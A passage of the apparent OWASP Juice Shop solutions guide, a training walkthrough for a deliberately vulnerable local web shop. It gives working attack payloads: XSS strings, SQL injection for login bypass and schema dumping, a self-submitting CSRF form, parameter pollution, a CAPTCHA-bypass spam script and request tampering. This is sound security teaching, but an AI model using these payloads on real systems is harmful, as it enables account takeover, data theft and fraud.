<a href="http://localhost:3000/.well-known/security.txt" class="bare">http://localhost:3000/.well-known/security.txt</a> or
<a href="http://localhost:3000/security.txt" class="bare">http://localhost:3000/security.txt</a> to solve the challenge.</p>
</li>
<li>
<p>Optionally, write an email to the mentioned contact address
<a href="mailto:donotreply@owasp-juice.shop">donotreply@owasp-juice.shop</a> and see what happens&#8230;&#8203; :e-mail:</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_inform_the_shop_about_an_algorithm_or_library_it_should_definitely_not_use_the_way_it_does"><a class="anchor" href="#_inform_the_shop_about_an_algorithm_or_library_it_should_definitely_not_use_the_way_it_does"></a>Inform the shop about an algorithm or library it should definitely not use the way it does</h3>
<div class="paragraph">
<p>Juice Shop uses some inappropriate crypto algorithms and libraries in
different places. While working on the following topics (and having the
<code>package.json.bak</code> at hand) you will learn those inappropriate choices
in order to exploit and solve them:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="#forge-a-coupon-code-that-gives-you-a-discount-of-at-least-80">Forge a coupon code that gives you a discount of at least 80%</a>
exploits <code>z85</code> (Zero-MQ Base85 implementation) as the library for
coupon codes.</p>
</li>
<li>
<p><a href="#solve-challenge-999">Solve challenge #999</a> requires you to create a
valid hash with the <code>hashid</code> library.</p>
</li>
<li>
<p>Passwords in the <code>Users</code> table are hashed with unsalted MD5</p>
</li>
<li>
<p>Users registering via Google account will receive a very silly default
password that involves Base64 encoding.</p>
</li>
</ul>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a>.</p>
</li>
<li>
<p>Submit your feedback with one of the following words in the comment:
<code>z85</code>, <code>base85</code>, <code>base64</code>, <code>md5</code> or <code>hashid</code>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_reflected_xss_attack"><a class="anchor" href="#_perform_a_reflected_xss_attack"></a>Perform a reflected XSS attack</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Do some shopping and then visit the <em>Order History</em>.</p>
</li>
<li>
<p>Clicking on the little "Truck" button for any of your orders will
show you the delivery status of your order.</p>
</li>
<li>
<p>Notice the <code>id</code> parameter in the URL
<a href="http://localhost:3000/#/track-result?id=fe01-f885a0915b79f2a9" class="bare">http://localhost:3000/#/track-result?id=fe01-f885a0915b79f2a9</a> with
<code>fe01-f885a0915b79f2a9</code> being one of your order numbers?</p>
</li>
<li>
<p>As the <code>fe01-f885a0915b79f2a9</code> is displayed on the screen, it might
be susceptible to an XSS attack.</p>
</li>
<li>
<p>Paste the attack string <code>&lt;iframe src="javascript:alert(`xss</code>)"&gt;`
into that URL so that you have
<a href="http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" class="bare">http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E</a></p>
</li>
<li>
<p>Refresh that URL to get the XSS payload executed and the challenge
marked as solved.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss0_alert.png" alt="XSS alert box">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_determine_the_answer_to_johns_security_question"><a class="anchor" href="#_determine_the_answer_to_johns_security_question"></a>Determine the answer to John&#8217;s security question</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to the photo wall and search for the photo that has been posted by
the user <code>j0hNny</code>.</p>
</li>
<li>
<p>Download that photo.</p>
</li>
<li>
<p>Check the metadata of the photo. You can use various tools online
like <a href="http://exif.regex.info/exif.cgi" class="bare">http://exif.regex.info/exif.cgi</a></p>
</li>
<li>
<p>When viewing the metadata, you can see the coordinates of where the
photo was taken. The coordinates are <code>36.958717N 84.348217W</code></p>
</li>
<li>
<p>Search for these coordinates on Google to find out in which forest
the photo was taken. It can be seen that the <code>Daniel Boone National
Forest</code> is located on these coordinates.</p>
</li>
<li>
<p>Go to the login page and click on <em>Forgot your password?</em>.</p>
</li>
<li>
<p>Fill in <code>john@juice-sh.op</code> as the email and <code>Daniel Boone National
Forest</code> as the answer of the security question.</p>
</li>
<li>
<p>Choose a new password and click on <em>Change</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_determine_the_answer_to_emmas_security_question"><a class="anchor" href="#_determine_the_answer_to_emmas_security_question"></a>Determine the answer to Emma&#8217;s security question</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to the photo wall and search for the photo that has been posted by
the user <code>E=ma²</code>.</p>
</li>
<li>
<p>Open the image so that you can zoom in on it.</p>
</li>
<li>
<p>On the far left window on the middle floor, you can see a logo of a
company. It can be seen that logo shows the name <code>ITsec</code>.</p>
</li>
<li>
<p>Go to the login page and click on <em>Forgot your password?</em>.</p>
</li>
<li>
<p>Fill in <code>emma@juice-sh.op</code> as the email and <code>ITsec</code> as the answer of
the security question.</p>
</li>
<li>
<p>Choose a new password and click on <em>Change</em>.</p>
</li>
</ol>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges_3"><a class="anchor" href="#_challenges_3"></a>⭐⭐⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_register_as_a_user_with_administrator_privileges"><a class="anchor" href="#_register_as_a_user_with_administrator_privileges"></a>Register as a user with administrator privileges</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Submit a <code>POST</code> request to <a href="http://localhost:3000/api/Users" class="bare">http://localhost:3000/api/Users</a> with:</p>
<div class="ulist">
<ul>
<li>
<p><code>{"email":"admin","password":"admin","role":"admin"}</code> as body</p>
</li>
<li>
<p>and <code>application/json</code> as <code>Content-Type</code></p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/register-admin_postman.png" alt="Admin user registration request via Postman">
</div>
</div>
</li>
<li>
<p>Upon your next visit to the application&#8217;s web UI the challenge will
be marked as solved.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_put_an_additional_product_into_another_users_shopping_basket"><a class="anchor" href="#_put_an_additional_product_into_another_users_shopping_basket"></a>Put an additional product into another user&#8217;s shopping basket</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Inspect HTTP traffic while putting items into your own shopping
basket to learn your own <code>BasketId</code>. For this solution we assume
yours is <code>1</code> and another user&#8217;s basket with a <code>BasketId</code> of <code>2</code>
exists.</p>
</li>
<li>
<p>Submit a <code>POST</code> request to <a href="http://localhost:3000/api/BasketItems" class="bare">http://localhost:3000/api/BasketItems</a>
with payload as <code>{"ProductId": 14,"BasketId": "2","quantity": 1}</code>
making sure no product of that with <code>ProductId</code> of <code>14</code> is already in
the target basket. Make sure to supply your <code>Authorization Bearer</code>
token in the request header.</p>
</li>
<li>
<p>You will receive a (probably unexpected) response of <code>{'error' :
'Invalid BasketId'}</code> - after all, it is not your basket!</p>
</li>
<li>
<p>Change your <code>POST</code> request into utilizing HTTP Parameter Pollution
(HPP) by supplying your own <code>BasketId</code> <em>and</em> that of someone else in
the same payload, i.e. <code>{"ProductId": 14,"BasketId": "1","quantity":
1,"BasketId": "2"}</code>.</p>
</li>
<li>
<p>Submitting this request will satisfy the validation based on your own
<code>BasketId</code> but put the product into the other basket!</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>ℹ️ With other <code>BasketId</code>s you might need to play with the order of the
duplicate property a bit and/or make sure your own <code>BasketId</code> is lower
than the one of the target basket to make this HPP vulnerability work in
your favor.</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Supplying multiple HTTP parameters with the same name may cause an
application to interpret values in unanticipated ways. By exploiting
these effects, an attacker may be able to bypass input validation,
trigger application errors or modify internal variables values. As
HTTP Parameter Pollution (in short HPP) affects a building block of
all web technologies, server and client side attacks exist.</p>
</div>
<div class="paragraph">
<p>Current HTTP standards do not include guidance on how to interpret
multiple input parameters with the same name. For instance, RFC 3986
simply defines the term Query String as a series of field-value pairs
and RFC 2396 defines classes of reserved and unreserved query string
characters. Without a standard in place, web application components
handle this edge case in a variety of ways (see the table below for
details).</p>
</div>
<div class="paragraph">
<p>By itself, this is not necessarily an indication of vulnerability.
However, if the developer is not aware of the problem, the presence of
duplicated parameters may produce an anomalous behavior in the
application that can be potentially exploited by an attacker. As often
in security, unexpected behaviors are a usual source of weaknesses
that could lead to HTTP Parameter Pollution attacks in this case. To
better introduce this class of vulnerabilities and the outcome of HPP
attacks, it is interesting to analyze some real-life examples that
have been discovered in the past. <sup class="footnote" id="_footnote_7">[<a id="_footnoteref_1" class="footnote" href="#_footnotedef_1" title="View footnote.">1</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_submit_10_or_more_customer_feedbacks_within_10_seconds"><a class="anchor" href="#_submit_10_or_more_customer_feedbacks_within_10_seconds"></a>Submit 10 or more customer feedbacks within 10 seconds</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open the Network tab of your browser DevTools and visit
<a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
</li>
<li>
<p>You should notice a <code>GET</code> request to
<a href="http://localhost:3000/rest/captcha/" class="bare">http://localhost:3000/rest/captcha/</a> which retrieves the CAPTCHA for
the feedback form. The HTTP response body will look similar to
<code>{"captchaId":18,"captcha":"5*8*8","answer":"320"}</code>.</p>
</li>
<li>
<p>Fill out the form normally and submit it while checking the backend
interaction in your Developer Tools. The CAPTCHA identifier and
solution are transmitted along with the feedback in the request body:
<code>{comment: "Hello", rating: 1, captcha: "320", captchaId: 18}</code></p>
</li>
<li>
<p>You will notice that a new CAPTCHA is retrieved from the REST
endpoint. It will present a different math challenge, e.g.
<code>{"captchaId":19,"captcha":"1*1-1","answer":"0"}</code></p>
</li>
<li>
<p>Write another feedback but before sending it, change the <code>captchaId</code>
and <code>captcha</code> parameters to the previous values of <code>captchaId</code> and
<code>answer</code>. In this example you would submit <code>captcha: "320",
captchaId: 18</code> instead of <code>captcha: "0", captchaId: 19</code>.</p>
</li>
<li>
<p>The server will accept your feedback, telling your that the CAPTCHA
can be pinned to any previous one you like.</p>
</li>
<li>
<p>Write a script with a 10-iteration loop that submits feedback using
your pinned <code>captchaId</code> and <code>captcha</code> parameters. Running this script
will solve the challenge.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Two alternate (but more complex) solutions:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>Rewrite your script so that it <em>parses the response from each CAPTCHA
retrieval call</em> to <a href="http://localhost:3000/rest/captcha/" class="bare">http://localhost:3000/rest/captcha/</a> and sets the
extracted <code>captchaId</code> and <code>answer</code> parameters in each subsequent form
submission as <code>captchaId</code> and <code>captcha</code>.</p>
</li>
<li>
<p>Using an automated browser test tool like
<a href="https://www.seleniumhq.org/">Selenium WebDriver</a> you could do the
following:</p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Read the CAPTCHA question from the HTML element <code>&lt;code id="captcha"
...&gt;</code></p>
</li>
<li>
<p>Calculate the result on the fly using JavaScript</p>
</li>
<li>
<p>Let WebDriver write the answer into the <code>&lt;input
name="feedbackCaptcha" ...&gt;</code> field.</p>
</li>
</ol>
</div>
</li>
</ul>
</div>
<div class="paragraph">
<p>The latter is actually the way it is implemented in the end-to-end test
for this challenge:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-javascript hljs" data-lang="javascript">  describe('challenge "captchaBypass"', () =&gt; {
   it('should be possible to post 10 or more customer feedbacks in less than 20 seconds', () =&gt; {
      cy.window().then(async () =&gt; {
         for (let i = 0; i &lt; 15; i++) {
            const response = await fetch(
                    `${Cypress.env('baseUrl')}/rest/captcha/`,
                    {
                       method: 'GET',
                       headers: {
                          'Content-type': 'text/plain'
                       }
                    }
            )
            if (response.status === 200) {
               const responseJson = await response.json()

               await sendPostRequest(responseJson)
            }

            async function sendPostRequest (captcha: {
               captchaId: number
               answer: string
            }) {
               await fetch(`${Cypress.env('baseUrl')}/api/Feedbacks`, {
                  method: 'POST',
                  cache: 'no-cache',
                  headers: {
                     'Content-type': 'application/json'
                  },
                  body: JSON.stringify({
                     captchaId: captcha.captchaId,
                     captcha: `${captcha.answer}`,
                     comment: `Spam #${i}`,
                     rating: 3
                  })
               })
            }
         }
      })
      cy.expectChallengeSolved({ challenge: 'CAPTCHA Bypass' })
   })
})</code></pre>
</div>
</div>
<div class="paragraph">
<p><em>It is worth noting that both alternate solutions would still work even
if the CAPTCHA-pinning problem would be fixed in the application!</em></p>
</div>
<div class="paragraph">
<p>Last but not least, the following
<a href="https://github.com/aaronhnatiw/race-the-web">RaceTheWeb</a> config could
be used to solve this challenge. Other than the two above alternate
solutions, this one relies on CAPTCHA-pinning:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-toml hljs" data-lang="toml"># CAPTCHA Bypass
# Save this as captcha-bypass.toml
# Get Captcha information from this endpoint first: http://localhost:3000/rest/captcha/
# Then replace captchaId and captcha values in body parameter of this file
# Launch this file by doing ./racethweb captcha-bypass.toml
count = 10
verbose = true
[[requests]]
    method = "POST"
    url = "http://localhost:3000/api/Feedbacks/"
    body = "{\"captchaId\":12,\"captcha\":\"-1\",\"comment\":\"pwned2\",\"rating\":5}"
    headers = ["Content-Type: application/json"]</code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_change_the_name_of_a_user_by_performing_cross_site_request_forgery_from_another_origin"><a class="anchor" href="#_change_the_name_of_a_user_by_performing_cross_site_request_forgery_from_another_origin"></a>Change the name of a user by performing Cross-Site Request Forgery from another origin</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open Juice Shop in a web browser which sets cookies with <code>SameSite=None</code>
by default. With Firefox 96.x or Chrome 79.x this has been successfully tested, but feel free to try other browsers at your leisure.</p>
</li>
<li>
<p>Login with any user account. This user is going to be the victim of
the CSRF attack.</p>
</li>
<li>
<p>Navigate to <a href="http://htmledit.squarefree.com" class="bare">http://htmledit.squarefree.com</a> in the same browser. It
is intentional that the site is accessed without TLS, as otherwise
there might be issues with the mixed-content policy of the browser.</p>
</li>
<li>
<p>In the upper frame of the page, paste the following HTML fragment,
which contains a self-submitting HTML form:</p>
</li>
</ol>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-html hljs" data-lang="html">&lt;form action="http://localhost:3000/profile" method="POST"&gt;
  &lt;input name="username" value="CSRF"/&gt;
  &lt;input type="submit"/&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
</div>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The attack is performed immediately. You will see an error message or
a blank page in the lower frame, because even though the online HTML
editor is allowed to send requests to Juice Shop, it is not permitted
to embed the response.</p>
</li>
<li>
<p>Verify that the username got changed to "CSRF" by checking the
<a href="http://localhost:3000/profile">profile page</a>.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>In an actual attack scenario, the attacker will try to trick a
legitimate user into opening an attacker-controlled website. If the
victim is simultaneously logged into the target website, the requested
that is generated by the malicious form in step 3 is authenticated with
the victim&#8217;s session. The attacker has also options to hide the
automatically issued request, for example by embedding it into an inline
frame of zero height and width.</p>
</div>
</div>
<div class="sect2">
<h3 id="_exfiltrate_the_entire_db_schema_definition_via_sql_injection"><a class="anchor" href="#_exfiltrate_the_entire_db_schema_definition_via_sql_injection"></a>Exfiltrate the entire DB schema definition via SQL Injection</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>From any errors seen during previous SQL Injection attempts you
should know that SQLite is the relational database in use.</p>
</li>
<li>
<p>Check <a href="https://www.sqlite.org/faq.html" class="bare">https://www.sqlite.org/faq.html</a> to learn in "(7) How do I
list all tables/indices contained in an SQLite database" that the
schema is stored in a system table <code>sqlite_master</code>.</p>
</li>
<li>
<p>You will also learn that this table contains a column <code>sql</code> which
holds the text of the original <code>CREATE TABLE</code> or <code>CREATE INDEX</code>
statement that created the table or index. Getting your hands on this
would allow you to replicate the entire DB schema.</p>
</li>
<li>
<p>During the
<a href="#order-the-christmas-special-offer-of-2014">Order the Christmas special offer of 2014</a>
challenge you learned that the <code>/rest/products/search</code> endpoint is
susceptible to SQL Injection into the <code>q</code> parameter.</p>
</li>
<li>
<p>The attack payload you need to craft is a <code>UNION SELECT</code> merging the
data from the <code>sqlite_master</code> table into the products returned in the
JSON result.</p>
</li>
<li>
<p>As a starting point we use the known working <code>'))--</code> attack pattern
and try to make a <code>UNION SELECT</code> out of it</p>
</li>
<li>
<p>Searching for <code>')) UNION SELECT * FROM x--</code> fails with a
<code>SQLITE_ERROR: no such table: x</code> as you would expect.</p>
</li>
<li>
<p>Searching for <code>')) UNION SELECT * FROM sqlite_master--</code> fails with a
promising <code>SQLITE_ERROR: SELECTs to the left and right of UNION do
not have the same number of result columns</code> which least confirms the
table name.</p>
</li>
<li>
<p>The next step in a <code>UNION SELECT</code>-attack is typically to find the
right number of returned columns. As the <em>Search Results</em> table in
the UI has 3 columns displaying data, it will probably at least be
three. You keep adding columns until no more <code>SQLITE_ERROR</code> occurs
(or at least it becomes a different one):</p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p><code>')) UNION SELECT '1' FROM sqlite_master--</code> fails with <code>number of
result columns</code> error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2' FROM sqlite_master--</code> fails with
<code>number of result columns</code> error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3' FROM sqlite_master--</code> fails with
<code>number of result columns</code> error</p>
</li>
<li>
<p>(&#8230;&#8203;)</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
sqlite_master--</code> <em>still fails</em> with <code>number of result columns</code>
error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
sqlite_master--</code> finally gives you a JSON response back with an
extra element
<code>{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}</code>.</p>
</li>
</ol>
</div>
</li>
<li>
<p>Next you get rid of the unwanted product results changing the query
into something like <code>qwert')) UNION SELECT '1', '2', '3', '4', '5',
'6', '7', '8', '9' FROM sqlite_master--</code> leaving only the
"<code>UNION</code>ed" element in the result set</p>
</li>
<li>
<p>The last step is to replace one of the fixed values with correct
column name <code>sql</code>, which is why searching for <code>qwert')) UNION SELECT
sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--</code>
solves the challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_obtain_a_deluxe_membership_without_paying_for_it"><a class="anchor" href="#_obtain_a_deluxe_membership_without_paying_for_it"></a>Obtain a Deluxe Membership without paying for it</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>If wallet is empty: a. Go to
<a href="http://localhost:3000/#/payment/deluxe" class="bare">http://localhost:3000/#/payment/deluxe</a> and look at the
available payment options for upgrading to a deluxe account b. Open
devtools and inspect the pay button next to the "pay using wallet"
option. c. Remove the disabled="true" attribute from the element to
enable it. d. Switch to the network tab and devtools and click on the
button to initiate payment e. See that there is a POST request sent,
which only contains one parameter in the request payload,
"paymentMode", which is set to "wallet". The response contains an
error saying your wallet doesn&#8217;t contain sufficient funds d. Right
click on the request and select "edit and resend" e. Change the
paymentMode parameter to an empty string and press send. This solves
the challenge and juice-shop no longer knows where to deduct the
money from</p>
</li>
<li>
<p>If wallet isn&#8217;t empty: a. If your wallet contains funds, you cannot
start a dummy transaction to inspect the request structure because
then you would be automatically upgraded to deluxe. b. Set up a proxy
like OWASP ZAP, Fiddler aur Burp Suite. c. Click on the pay button d.
Intercept and edit the request as described above before forwarding
it.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_post_some_feedback_in_another_users_name"><a class="anchor" href="#_post_some_feedback_in_another_users_name"></a>Post some feedback in another user&#8217;s name</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Go to the <em>Contact Us</em> form on <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a>.</p>
</li>
<li>
<p>Inspect the DOM of the form in your browser to spot this suspicious
text field right at the top: <code>&lt;input _ngcontent-c23 hidden
id="userId" type="text" class="ng-untouched ng-pristine ng-valid"&gt;</code></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/hidden_textfield.png" alt="Hidden text field on Contact Us form">
</div>
</div>
</li>
<li>
<p>In your browser&#8217;s developer tools remove the <code>hidden</code> attribute from
above <code>&lt;input&gt;</code> tag.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/spoofed_feedback.png" alt="Spoofed feedback ready for submit">
</div>
</div>
</li>
<li>
<p>The field should now be visible in your browser. Type any user&#8217;s
database identifier in there (other than your own if you are
currently logged in) and submit the feedback.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>You can also solve this challenge by directly sending a <code>POST</code> to
<a href="http://localhost:3000/api/Feedbacks" class="bare">http://localhost:3000/api/Feedbacks</a> endpoint. You could for example be
logged out but provide any <code>UserId</code> in the JSON payload.</p>
</div>
</div>
<div class="sect2">
<h3 id="_post_a_product_review_as_another_user_or_edit_any_users_existing_review"><a class="anchor" href="#_post_a_product_review_as_another_user_or_edit_any_users_existing_review"></a>Post a product review as another user or edit any user&#8217;s existing review</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Select any product and write a review for it
<span class="image"><img src="../_images/appendix/normal_review.png" alt="Simple product review"></span></p>
</li>
<li>
<p>Submit the review while observing the <code>Networks</code> tab of your browser.</p>
</li>
<li>
<p>Analyze the <code>PUT</code> request.
<span class="image"><img src="../_images/appendix/normal_review_request.png" alt="normal product request"></span></p>
</li>
<li>
<p>Change the author name to <code>admin@juice-sh.op</code> in <code>Request Body</code> and
re-send the request.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_chris_erased_user_account"><a class="anchor" href="#_log_in_with_chris_erased_user_account"></a>Log in with Chris' erased user account</h3>
<div class="ulist">
<ul>
<li>
<p>Log in with <em>Email</em> <code>chris.pike@juice-sh.op'--</code> and any <em>Password</em> if
you already know the email address of Chris.</p>
</li>
<li>
<p>or log in with <em>Email</em> as <code>\' or deletedAt IS NOT NULL--</code> and any
<em>Password</em> you like for a "lucky hit" as Chris seems to be the only or
at least first ever deleted user. The presence of <code>deletedAt</code> you
might have derived from
<a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a>
and enforcing it to be <code>NOT NULL</code> will give you back only users who
were soft-deleted at some point of time.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_amys_original_user_credentials"><a class="anchor" href="#_log_in_with_amys_original_user_credentials"></a>Log in with Amy&#8217;s original user credentials</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Google for either <code>93.83 billion trillion trillion centuries</code> or <code>One
Important Final Note</code>.</p>
</li>
<li>
<p>Both searches should show <a href="https://www.grc.com/haystack.htm" class="bare">https://www.grc.com/haystack.htm</a> as one
of the top hits.</p>
</li>
<li>
<p>After reading up on <em>Password Padding</em> try the example password
<code>D0g.....................</code></p>
</li>
<li>
<p>She actually did a very similar padding trick, just with the name of
her husband <em>Kif</em> written as <em>K1f</em> instead of <em>D0g</em> from the example!
She did not even bother changing the padding length!</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a> and log in with credentials
<code>amy@juice-sh.op</code> and password <code>K1f.....................</code> to solve
the challenge</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_benders_user_account"><a class="anchor" href="#_log_in_with_benders_user_account"></a>Log in with Bender&#8217;s user account</h3>
<div class="ulist">
<ul>
<li>
<p>Log in with <em>Email</em> <code>bender@juice-sh.op'--</code> and any <em>Password</em> if you
already know the email address of Bender.</p>
</li>
<li>
<p>A rainbow table attack on Bender&#8217;s password will probably fail as it
is rather strong. You can alternatively solve
<a href="#change-benders-password-into-slurmcl4ssic-without-using-sql-injection-or-forgot-password">Change Bender&#8217;s password into <em>slurmCl4ssic</em> without using SQL Injection or Forgot Password</a>
first and then simply log in with the new password.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_jims_user_account"><a class="anchor" href="#_log_in_with_jims_user_account"></a>Log in with Jim&#8217;s user account</h3>
<div class="ulist">
<ul>
<li>
<p>Log in with <em>Email</em> <code>jim@juice-sh.op'--</code> and any <em>Password</em> if you
already know the email address of Jim.</p>
</li>
<li>
<p>or log in with <em>Email</em> <code>jim@juice-sh.op</code> and <em>Password</em> <code>ncc-1701</code> if
you looked up Jim&#8217;s password hash in a rainbow table after harvesting
the user data as described in
<a href="#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a>.</p>
</li>
</ul>
</div>
</div>
<div class="sect2">
<h3 id="_place_an_order_that_makes_you_rich"><a class="anchor" href="#_place_an_order_that_makes_you_rich"></a>Place an order that makes you rich</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Put at least one item into your shopping basket.</p>
</li>
<li>
<p>Note that reducing the quantity of a basket item below 1 is not
possible via the UI</p>
</li>
<li>
<p>When changing the quantity via the UI, you will notice <code>PUT</code> requests
to <a href="http://localhost:3000/api/BasketItems/{id}">http://localhost:3000/api/BasketItems/{id}</a> in the Network tab of
your DevTools</p>
</li>
<li>
<p>Memorize the <code>{id}</code> of any item in your basket</p>
</li>
<li>
<p>Copy your <code>Authorization</code> header from any HTTP request submitted via
browser.</p>
</li>
<li>
<p>Submit a <code>PUT</code> request to
<a href="http://localhost:3000/api/BasketItems/{id}">http://localhost:3000/api/BasketItems/{id}</a> replacing <code>{id}</code> with
the memorized number from 5. and with:</p>
<div class="ulist">
<ul>
<li>
<p><code>{"quantity": -100}</code> as body,</p>
</li>
<li>
<p><code>application/json</code> as <code>Content-Type</code></p>
</li>
<li>
<p>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with
the token you copied from the browser.</p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/negative_order_postman-body.png" alt="Negative quantity request body in PostMan">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/basket" class="bare">http://localhost:3000/#/basket</a> to view <em>Your Basket</em> with the
negative quantity on the first item</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/negative_order-basket.png" alt="Basket with negative item quantity">
</div>
</div>
</li>
<li>
<p>Click <em>Checkout</em> to issue the negative order and solve this
challenge.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/negative_order_pdf.pdf.png" alt="Order confirmation with negative total">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_prove_that_you_actually_read_our_privacy_policy"><a class="anchor" href="#_prove_that_you_actually_read_our_privacy_policy"></a>Prove that you actually read our privacy policy</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open <a href="http://localhost:3000/#/privacy-security/privacy-policy" class="bare">http://localhost:3000/#/privacy-security/privacy-policy</a>.</p>
</li>
<li>
<p>Moving your mouse cursor over each paragraph will make a fire-effect
appear on certain words or partial sentences.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/privacy-policy_hot-section.png" alt="Hot section in the privacy policy">
</div>
</div>
</li>
<li>
<p>Inspect the HTML in your browser and note down all text inside <code>&lt;span
class="hot"&gt;</code> tags, which are <code>http://localhost</code>, <code>We may also</code>,
<code>instruct you</code>, <code>to refuse all</code>, <code>reasonably necessary</code> and
<code>responsibility</code>.</p>
</li>
<li>
<p>Combine those into the URL
<a href="http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility" class="bare">http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility</a>
(adding the server port if needed) and solve the challenge by
visiting it.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>It seems the Juice Shop team did not appreciate your extensive reading
effort enough to provide even a tiny gratification, as you will receive
only a <code>404 Error: ENOENT: no such file or directory, stat
'/app/frontend/dist/frontend/assets/private/thank-you.jpg'</code>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_change_the_href_of_the_link_within_the_o_saft_product_description"><a class="anchor" href="#_change_the_href_of_the_link_within_the_o_saft_product_description"></a>Change the href of the link within the O-Saft product description</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>By searching for <em>O-Saft</em> directly via the REST API with
<a href="http://localhost:3000/rest/products/search?q=o-saft" class="bare">http://localhost:3000/rest/products/search?q=o-saft</a> you will learn
that it&#8217;s database ID is <code>9</code>.</p>
</li>
<li>
<p>Submit a <code>PUT</code> request to <a href="http://localhost:3000/api/Products/9" class="bare">http://localhost:3000/api/Products/9</a>
with:</p>
<div class="ulist">
<ul>
<li>
<p><code>{"description": "&lt;a href=\"https://owasp.slack.com\"
target=\"_blank\"&gt;More...&lt;/a&gt;"}</code> as body</p>
</li>
<li>
<p>and <code>application/json</code> as <code>Content-Type</code></p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/osaft_postman-body.png" alt="O-Saft link update via PostMan">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
